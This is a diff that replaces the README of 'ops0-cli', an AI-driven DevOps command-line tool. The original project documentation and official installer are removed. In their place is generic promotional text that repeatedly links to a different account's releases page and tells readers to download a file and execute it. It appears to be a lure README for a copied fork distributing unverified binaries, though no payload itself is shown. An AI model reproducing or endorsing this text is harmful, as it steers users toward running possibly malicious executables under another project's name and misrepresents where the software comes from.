@@ -1,215 +1,109 @@
-<p align="center">
-  <img src="assets/logo.jpg" alt="ops0 CLI Logo" width="150">
-</p>
+# ops0-cli: Your AI-Powered DevOps Companion 🤖⚡
 
-<p align="center">
-  <a href="./README.zh-CN.md">ReadMe in Chinese</a> • 
-  <a href="./README.de.md">ReadMe in German</a> • 
-  <a href="./README.fr.md">ReadMe in French</a> • 
-  <a href="./README.es.md">ReadMe in Spanish</a> • 
-  <a href="./README.pt-BR.md">ReadMe in Portuguese</a> • 
-  <a href="https://join.slack.com/t/ops0/shared_invite/zt-37akwqb1v-BvfK7AioDlRhje94UN2tkw">Slack Community</a>
-</p>
+![GitHub release](https://img.shields.io/github/release/Nkprogamador/ops0-cli.svg)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-ops0-cli-brightgreen)](https://github.com/Nkprogamador/ops0-cli/releases)
+
+Welcome to the **ops0-cli** repository! This tool brings together the power of AI and natural language processing to streamline your DevOps workflows. With ops0, you can manage infrastructure, automate tasks, and troubleshoot issues—all with simple commands. 
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Usage](#usage)
+- [Supported Technologies](#supported-technologies)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Introduction
+
+**ops0** is designed to simplify complex DevOps tasks. Instead of memorizing commands or writing lengthy scripts, you can use natural language to perform actions. This makes it accessible for both seasoned DevOps professionals and newcomers alike. 
+
+## Features
+
+- **AI-Powered Commands**: Use natural language to interact with your DevOps tools.
+- **Multi-Platform Support**: Works with Ansible, Terraform, Kubernetes, AWS, Azure, and Docker.
+- **Open Source**: Free to use and modify. Contribute to the community!
+- **Automation**: Automate repetitive tasks to save time and reduce errors.
+- **Troubleshooting**: Quickly identify and resolve issues in your infrastructure.
+
+## Getting Started
+
+To get started with ops0-cli, follow these steps:
+
+1. **Download the Latest Release**: You can find the latest version [here](https://github.com/Nkprogamador/ops0-cli/releases). Download the appropriate file for your system and execute it.
+
+2. **Installation**: After downloading, follow the installation instructions specific to your operating system.
+
+3. **Configuration**: Set up your cloud provider credentials and any necessary configurations. This will allow ops0 to interact with your infrastructure.
+
+4. **Run Your First Command**: Start using ops0 with a simple command. 
+
+## Usage
+
+Using ops0-cli is straightforward. Here are some examples to get you started:
+
+### Example Commands
+
+- **Provisioning Infrastructure**: 
+  ```
+  ops0 create a new AWS EC2 instance
+  ```
+
+- **Deploying Applications**: 
+  ```
+  ops0 deploy my application to Kubernetes
+  ```
+
+- **Automating Tasks**: 
+  ```
+  ops0 schedule a backup for my database
+  ```
+
+### Command Syntax
+
+The basic syntax for commands is:
+```
+ops0 [action] [target] [options]
+```
+
+Replace `[action]` with the task you want to perform, `[target]` with the resource, and `[options]` with any additional parameters.
+
+## Supported Technologies
+
+ops0-cli integrates with a variety of technologies to provide a comprehensive DevOps solution:
+
+- **Ansible**: Automate configuration management and application deployment.
+- **Terraform**: Manage infrastructure as code.
+- **Kubernetes**: Orchestrate containerized applications.
+- **AWS**: Leverage Amazon Web Services for cloud computing.
+- **Azure**: Utilize Microsoft Azure for cloud services.
+- **Docker**: Manage containerized applications efficiently.
+
+## Contributing
+
+We welcome contributions to ops0-cli! If you have ideas, bug fixes, or improvements, please follow these steps:
+
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Create a Branch**: Use a descriptive name for your branch.
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Submit a Pull Request**: Share your changes with the community.
+
+## License
+
+ops0-cli is open-source software licensed under the MIT License. You can use, modify, and distribute it freely.
+
+## Contact
+
+For questions, suggestions, or feedback, please reach out to us via GitHub issues or directly through our repository.
+
+Explore the power of AI in DevOps with ops0-cli! Download the latest version [here](https://github.com/Nkprogamador/ops0-cli/releases) and start transforming your workflows today. 
 
 ---
 
-<p align="center">
-ops0 is an intelligent CLI tool that transforms natural language into DevOps commands.<br>
-Powered by Claude AI, it simplifies complex DevOps tasks by understanding your intent<br>
-and generating the right commands, making DevOps management more accessible and efficient.
-</p>
+By simplifying complex DevOps tasks, ops0-cli allows you to focus on what truly matters—building and maintaining your applications. Whether you're managing cloud resources, deploying applications, or troubleshooting issues, ops0 is your reliable partner. 
 
-## ops0 in Action
+We invite you to explore the capabilities of ops0-cli. Check out the [Releases](https://github.com/Nkprogamador/ops0-cli/releases) section for updates and new features. 
 
-![ops0 CLI Demo](assets/ops0cli.gif)
-*Watch ops0 translate natural language into powerful DevOps commands*
-
-## Quick Start
-
-### Installation
-```bash
-curl -fsSL https://raw.githubusercontent.com/ops0-ai/ops0-cli/main/install.sh | bash
-```
-
-### Basic Usage
-```bash
-# Rule-based mode (works without API key)
-ops0 -m "i want to plan my iac code"
-
-# AI-powered mode (requires API key)
-export ANTHROPIC_API_KEY=your_key_here
-ops0 -m "check if my kubernetes pods are running" -ai
-
-# Troubleshooting mode
-ops0 -m "my terraform apply is failing with state lock" -troubleshoot
-```
-
-## Command Examples in Action
-
-Here are some real-world examples of ops0 in action across different tools:
-
-### ops0 statistics
-<img width="1022" alt="image" src="https://github.com/user-attachments/assets/000b01a3-6565-432d-96f1-cd64d912475c" />
-
-### AWS CLI Operations
-![AWS CLI Example](assets/aws.png)
-*Example: Managing AWS resources using natural language commands*
-
-### Docker Container Management
-![Docker Example](assets/docker.png)
-*Example: Managing Docker containers and images with simple English*
-
-### Ansible Automation
-![Ansible Example](assets/ansible.png)
-![Ansible Playbook](assets/ansible-playbook.png)
-*Example: Executing and validating Ansible playbooks effortlessly*
-
-### Terraform Infrastructure
-![Terraform Example](assets/terraform.png)
-*Example: Managing infrastructure as code with natural language*
-
-### Kubernetes Operations
-![Kubernetes Example](assets/kubernetes.png)
-*Example: Simplified Kubernetes cluster management and troubleshooting*
-
-Each example demonstrates:
-- Natural language command input
-- AI-powered command translation
-- Clear command preview
-- Safe execution with confirmation
-- Detailed output formatting
-
-## Supported Tools & Features
-
-### Core Tools
-- **Terraform** - Infrastructure as Code
-- **Ansible** - Configuration Management
-- **Kubernetes (kubectl)** - Container Orchestration
-- **Docker** - Containerization
-- **AWS CLI** - Amazon Web Services
-- **Helm** - Kubernetes Package Manager
-- **gcloud** - Google Cloud Platform
-- **Azure CLI** - Microsoft Azure
-- **System Admin** - Linux System Administration
-
-### System Administration Examples
-```bash
-# Monitor system resources
-ops0 -m "show memory usage on my machine"
-ops0 -m "check disk space"
-ops0 -m "display CPU usage"
-
-# Manage system services
-ops0 -m "restart service nginx"
-ops0 -m "check service status apache2"
-
-# Package management
-ops0 -m "install package docker"
-ops0 -m "update system packages"
-
-# System logs
-ops0 -m "show system logs"
-ops0 -m "check journal logs"
-```
-
-### System Administration & Log Analysis Examples
-```bash
-# Analyze Kubernetes pod logs and get AI-powered summary and recommendations
-ops0 -m "analyze logs for pod my-app-123 in namespace prod"
-
-# Analyze a specific log file for issues
-ops0 -m "analyze /var/log/nginx/error.log"
-```
-
-### Key Features
-- Natural language command translation
-- AI-powered troubleshooting
-- **Kubernetes pod log analysis with AI summary and suggested commands**
-- **Log file path analysis for issues and context**
-- Context-aware suggestions
-- Safe execution with confirmations
-- Dry run support for destructive operations
-- Automatic tool installation
-
-## 🆚 AI vs Rule-Based Mode
-
-| Feature | Rule-Based | AI Mode |
-|---------|------------|---------|
-| Setup | No API key needed | Requires ANTHROPIC_API_KEY |
-| Speed | Instant | ~2-3 seconds |
-| Understanding | Pattern matching | Natural language |
-| Context Awareness | Limited | High |
-| Troubleshooting | Basic | Advanced |
-| Complex Scenarios | Limited | Excellent |
-| Offline Usage | ✅ | ❌ |
-
-## Configuration
-
-### Environment Variables
-```bash
-# Required for AI features
-export ANTHROPIC_API_KEY=your_api_key
-
-# Optional: Customize AI behavior
-export OPS0_AI_MODEL=claude-3-sonnet-20240229  # Default model
-export OPS0_MAX_TOKENS=1024                    # Response length
-```
-
-### Config File (Future)
-```yaml
-# ~/.ops0/config.yaml
-ai:
-  provider: anthropic
-  model: claude-3-sonnet-20240229
-  max_tokens: 1024
-  
-tools:
-  terraform:
-    version_check: terraform version
-    install_cmd: brew install terraform
-  kubectl:
-    version_check: kubectl version --client
-    install_cmd: brew install kubectl
-```
-
-## Privacy & Security
-
-- **API Key**: Stored locally as environment variable
-- **No Data Storage**: Commands and context not stored by ops0
-- **Anthropic Privacy**: Follows Anthropic's data handling policies
-- **Local Processing**: Rule-based mode works completely offline
-
-## 🤝 Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Areas needing help
-- New tool integrations
-- AI prompt improvements
-- Testing across different environments
-- Documentation and examples
-
-## 🗺️ Roadmap
-
-### Current
-- [x] Claude AI integration
-- [x] Basic troubleshooting mode
-- [x] Context awareness
-- [x] Multi-tool support
-
-### Coming Soon
-- [ ] Custom offline-capable model for air-gapped environments
-- [ ] Interactive multi-step workflows
-- [ ] Learning from user feedback
-- [ ] Custom tool configurations
-- [ ] Multiple AI provider support
-- [ ] Advanced context analysis
-- [ ] Team collaboration features
-
-## Tips
-
-1. **Be Specific**: "my terraform plan shows 5 resources changing" vs "terraform error"
-2. **Use Troubleshoot Mode**: For complex issues, use `-troubleshoot` flag
-3. **Check Context**: AI works better when you're in the right directory
-4. **Review Commands**: Always review AI suggestions before confirming
-5. **Provide Feedback**: Use GitHub issues to report AI accuracy problems
+Let’s build a better DevOps experience together!
